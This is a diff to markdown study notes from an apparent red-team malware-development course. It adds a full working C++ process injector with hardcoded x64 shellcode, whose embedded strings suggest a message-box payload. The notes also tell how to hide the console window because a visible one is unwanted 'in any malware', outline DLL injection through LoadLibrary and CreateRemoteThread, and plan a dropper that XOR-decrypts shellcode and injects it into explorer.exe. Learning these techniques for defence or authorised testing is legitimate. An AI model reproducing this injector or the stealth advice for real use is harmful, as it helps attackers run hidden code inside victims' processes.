@@ -612,3 +612,213 @@ And after that we can restore the execution flow, first by executing popfd and p
 
 Now, if we patch the application, it will go to the codecave, execute the shellcode and then go back to the original PuTTY routine, popping the original program too:
 ![[attachments/sektor_beginner-80.png]]
+# Process injection
+I developed a process injector that accepts a process name and obtains its PID and then injects a shellcode into the process ID.
+In this course, the main functions in process injection (at least, the basics):
+- `OpenProcess` to get a handle to the process that we will inject our shellcode into
+- `VirtualAllocEx` to create a memory zone into the selected process memory.
+- `WriteProcessMemory` to write our shellcode into the created memory zone.
+- `VirtualProtectEx` to change the memory permissions to executable.
+- `CreateRemoteThread` to execute that region of memory that contains our shellcode. 
+
+This image is similar but without changing the memory permissions (I prefer to change the permissions as it is a good evasive technique per se).
+![[attachments/sektor_beginner-81.png]]
+
+The shellcode is hardcoded into the program (we could use the other techniques to hide it statically), but I just wanted to isolate the process injection technique.
+
+And this is the program that injects into the remote process:
+```c++
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+#include <string>
+
+// Find PID by process name. Returns first occurrence.
+int findMyProc(wchar_t * procname) {
+
+	HANDLE hSnapshot; // Handle al snapshot de todos los procesos en el sistema.
+	PROCESSENTRY32 pe;
+	int pid = 0;
+	BOOL hResult;
+
+	printf("Searching for the process %s to get its PID...\n", procname);
+
+	// snapshot of all processes in the system
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+	// It is neccesary to initialize the size of the process entry.
+	/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
+	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */
+	pe.dwSize = sizeof(PROCESSENTRY32W);
+
+	// Retrieve infrormation about first process encountered in a system snapshot
+	hResult = Process32FirstW(hSnapshot, &pe);
+
+	// Get information about the obtained process using its handle
+	// and exit if unsuccessful
+	while (Process32NextW(hSnapshot, &pe)) {
+		if (lstrcmpW(pe.szExeFile, procname) == 0) {
+			pid = pe.th32ProcessID;
+			break;
+		}
+	}
+
+	// Close the open handle; we don't need it
+	CloseHandle(hSnapshot);
+	return pid;
+}
+
+
+int main(int argc, char * argv[]) {
+	// Check that we inserted the PID argument
+	if (argc < 2) {
+		printf("Usage of the tool: %s <PID>", argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	/* Variable declaration zone */
+	unsigned char shellcode[] = {
+	  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
+	  0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
+	  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
+	  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
+	  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
+	  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
+	  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
+	  0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
+	  0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
+	  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
+	  0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
+	  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
+	  0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
+	  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
+	  0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
+	  0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
+	  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
+	  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
+	  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
+	  0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
+	  0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
+	  0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
+	  0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
+	  0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+	  0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
+	  0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
+	  0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
+	  0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
+	};
+
+	unsigned int payload_len = sizeof(shellcode);
+
+	/* Managing the handles to the thread (CreateRemoteThread) and process (OpenProcess) */
+	HANDLE hThread = NULL;
+	HANDLE hOpenProcess = NULL; // Remember to always initialize variables
+
+	/* Getting the PID as the first argument */
+	char* payload_ascii = argv[1];
+
+	int size_needed = MultiByteToWideChar(CP_UTF8, 0, payload_ascii, -1, NULL, 0);
+	wchar_t* procname_wide = new wchar_t[size_needed];
+	MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, procname_wide, size_needed);
+
+	DWORD pid = findMyProc(procname_wide);
+
+	/* Declaring some variables that will store memaddresses */
+	LPVOID lpBufferAddress = NULL; // Pointer to void to store the address of the reserved buffer
+	DWORD lpflOldProtect = NULL; 
+	SIZE_T lpNumberOfBytesWritten = NULL;
+
+	// Get a handle to the process ID
+	printf("Executing OpenProcess to get a handle of process with PID (%ld)\n", pid);
+	hOpenProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
+
+	// If the function fails, the return value is NULL.
+	if (hOpenProcess == NULL) {
+		printf("Could not get a handle to PID (%ld). Error code %ld", pid, GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	printf("Got a handle to PID (%ld). Address of handle: 0x%p\n", pid, hOpenProcess); // With %p we get the memaddress of the handle
+
+	lpBufferAddress = VirtualAllocEx(hOpenProcess, NULL, payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE); // We reserve AND commit. For that, use |
+	// Remember closing the handle with CloseHandle once the handle is used.
+	if (lpBufferAddress == NULL) {
+		printf("Memory could not be allocated. Exiting...");
+		return EXIT_FAILURE;
+	}
+
+	printf("Got a memory zone starting at 0x%p\n", lpBufferAddress);
+
+	// We copy the buffer to the buffer as it is writable with WriteProcessMemory
+	BOOL wProcessMemory = WriteProcessMemory(hOpenProcess, lpBufferAddress, shellcode, payload_len, &lpNumberOfBytesWritten);
+	if (!wProcessMemory) {
+		printf("Could not write into the injected memory. Error code: %ld", GetLastError());
+	}
+
+	printf("Shellcode written into memory.\n");
+
+	// We now change the permissions of the memory address to execute, with VirtualProtectEx
+	BOOL vProtect = VirtualProtectEx(hOpenProcess, lpBufferAddress, payload_len, PAGE_EXECUTE_READ, &lpflOldProtect);
+	if (!vProtect) {
+		printf("Was not possible to change the permissions of the buffer. Error code: %ld", GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	printf("Changed the memory space so it is executable.\nExecuting shellcode...\n");
+
+	hThread = CreateRemoteThread(hOpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE) lpBufferAddress, NULL, 0, NULL);
+
+	if (hThread != NULL) {
+		WaitForSingleObject(hThread, 500);
+		printf("Thread started. Bye...");
+		CloseHandle(hOpenProcess);
+		CloseHandle(hThread);
+	}
+
+	return EXIT_SUCCESS;
+}
+```
+
+# Making the program invisible
+We have our implant that works, but if we click on the executable instead of launching it from console, we can see a window regarding our process popping up.
+This black window popping up in an user's screen is **something we don't want in any malware.**
+
+There are two methods to get rid of it:
+1. Call FreeConsole() at the start of the program. The problem is that **there is a still a fraction of time in which the window appears (until it does not reach the FreeConsole function, the window is still there).**
+2. Better trick: Call int WINAPI WinMain instead of int main() and change the compilation options to **tell the compiler to compile the program as a GUI program**. This way, the compiler will search for the WinMain function as we declared that the program must be compiled as GUI program.
+
+This way, we change the compilation options to tell that the program is a WINDOWS program (by default, it is a console program)
+![[attachments/sektor_beginner-83.png]]
+And then change the main() function for WinMain:
+![[attachments/sektor_beginner-84.png]]
+
+This won't have the same way to pass parameters as we are not running it on CLI, but, the thing is that our malware won't usually have parameters :). 
+# DLL Injection
+We will inject a DLL in the disk, but we can obtain the DLL from a remote server or it can be dropped by the program at runtime; we will use a DLL in disk as a PoC.
+Using a DLL remotely is better as you can hide it from static analysis, under you domain.
+
+Usually in DLL injection we allocate an empty buffer in a remote process (as before) but in this technique the buffer won't contain the DLL itself but **its path.** 
+This means that the size of the buffer must be, **at least, the size of the path of the DLL.** We will copy the path of the DLL to the buffer.
+No sense to copy the DLL in the buffer as the DLL gets dinamically loaded in the process memory space.
+
+But how can we load the DLL dinamically into the process?
+We can try to **create a thread in the victim process in charge of loading our DLL.**
+To do that, we would need to find the **memory address of the LoadLibrary function (kernel32.dll) of the victim process, take that memory address and then use CreateRemoteThread targeting that LoadLibrary memory address and the DLL path.** This way, a thread inside the victim process containing our DLL will be created.
+
+We can do an smarter thing: As we know that **kernel32.dll is loaded in the same address FOR ALL OF THE PROCESSES, we can search the LoadLibrary address into our program, and use that address into the target process.** 
+If everything goes well, system will load the DLL from disk and initialize it (this is why we don't allocate memory for the DLL as the system takes charge of that when we load the DLL. We just allocate the path of the DLL).
+The DLL will be loaded into the process, **and, of course, the DLL must be programmed so when it attaches to a process, it begins with the execution routine.**
+![[attachments/sektor_beginner-82.png]]
+
+Summarizing of the common DLL injection routine:
+- Get LoadLibrary address inside our program with GetProcAddress. This address will be the same for victim process.
+- Allocate a buffer (VirtualAllocEx) inside the victim process of the length of the DLL path and store the DLL path (WriteProcessMemory) inside that buffer.
+- CreateRemoteThread with the address of LoadLibrary and the path to DLL. 
+
+Important the ExitFunction=Thread on our shellcode, if not, we will crash the target process.
+![[attachments/sektor_beginner-85.png]]
+On the other hand, LoadLibrary will only execute the routine of the DLL attached to the process ONCE. If we inject several times in a row, we won't see results, we need to close and open the process.
+
+## Our dropper
+Our dropper will extract the shellcode from the resources inside its own PE structure, then decrypt the shellcode (it will be XOR encrypted) and it will inject the shellcode into explorer.exe.
